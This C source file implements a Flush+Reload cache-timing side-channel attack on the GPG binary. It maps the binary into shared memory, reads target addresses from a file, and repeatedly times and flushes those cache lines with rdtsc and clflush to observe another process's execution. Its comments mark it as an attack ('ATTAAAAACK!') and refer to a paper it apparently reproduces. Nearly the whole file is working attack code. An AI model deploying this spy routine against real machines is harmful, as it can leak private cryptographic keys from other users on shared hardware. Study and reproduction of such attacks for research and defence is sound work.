#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "args.h"

#define GPG_MAX_SIZE_BYTES 4194304
#define MAX_NUM_OF_ADDRS 10u

#ifndef MIN
#define	MIN(a,b) (((a)<(b))?(a):(b))
#endif /* MIN */
#ifndef MAX
#define	MAX(a,b) (((a)>(b))?(a):(b))
#endif	/* MAX */

unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
    for (size_t i = 0; i < num_addrs; i++) {
        // Here be dragons :O
        unsigned long ptr_offset = (unsigned long)gpg_base;
        char *adjusted_ptr = addrs[i] + ptr_offset;

        addrs[i] = adjusted_ptr;
    }
}

struct stats {
    unsigned long min;
    unsigned long max;
    unsigned long sum;
};

void spy(char **addrs, size_t num_addrs, int num_iterations) {
    struct stats addr_stats[num_addrs];

    // init
    for (size_t addr = 0; addr < num_addrs; addr++) {
        addr_stats[addr].min = (unsigned long) -1;
        addr_stats[addr].max = 0;
        addr_stats[addr].sum = 0;
    }

    for (int i = 0; i < num_iterations; i++) {
        for (size_t addr = 0; addr < num_addrs; addr++) {
            char *ptr = addrs[addr];
            unsigned long result = probe_timing(ptr);

            addr_stats[addr].min = MIN(addr_stats[addr].min, result);
            addr_stats[addr].max = MAX(addr_stats[addr].max, result);
            addr_stats[addr].sum += result;
        }
    }

    printf("Statistics after %d runs:\n", num_iterations);
    for (size_t addr = 0; addr < num_addrs; addr++) {
        printf("Address #%d statistics:\n", (int) addr);
        printf("min = %lu\n", addr_stats[addr].min);
        printf("max = %lu\n", addr_stats[addr].max);
        printf("mean = %lu\n", addr_stats[addr].sum / num_iterations);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s GPG addr\n", argv[0]);
        return 1;
    }

    char *gpg_path = argv[1];
    int gpg_fd;
    if ((gpg_fd = open(gpg_path, O_RDONLY)) == -1) {
        perror("open");
        return 1;
    }

    char *addr_path = argv[2];
    FILE *addr_file;
    if ((addr_file = fopen(addr_path, "r")) == NULL) {
        perror("fopen");
        return 1;
    }

    // memory map so we can force OS to share this memory page with GPG process
    size_t map_len = GPG_MAX_SIZE_BYTES;
    void *gpg_base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
            gpg_fd, 0);
    if (gpg_base == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("GPG binary mmapped to %p\n", gpg_base);

    // NOTE: this is an array of pointers. The paper uses `char *` for this, but
    // I'm not sure yet if we can get away with using `void *` instead, which I
    // think is a lot easier to understand.
    char *addrs[MAX_NUM_OF_ADDRS];
    size_t num_addrs = read_addrs(addr_file, addrs, MAX_NUM_OF_ADDRS);
    if (num_addrs == 0) {
        fprintf(stderr, "Did not read any addresses from file\n");
        return 0;
    }

    printf("Probing %lu addresses:\n", num_addrs);
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    offset_addresses(gpg_base, addrs, num_addrs);
    printf("Here are the offset addresses (respectively):\n");
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    // ATTAAAAACK!
    printf("Started timing\n");
    spy(addrs, num_addrs, 10000);
    printf("Finished timing\n");

    // Probably never reached because we'll likely just ^C the program. Maybe
    // implement a SIGTERM / SIGINT handler?
    munmap(gpg_base, map_len);
    close(gpg_fd);
    fclose(addr_file);
    return 0;
}

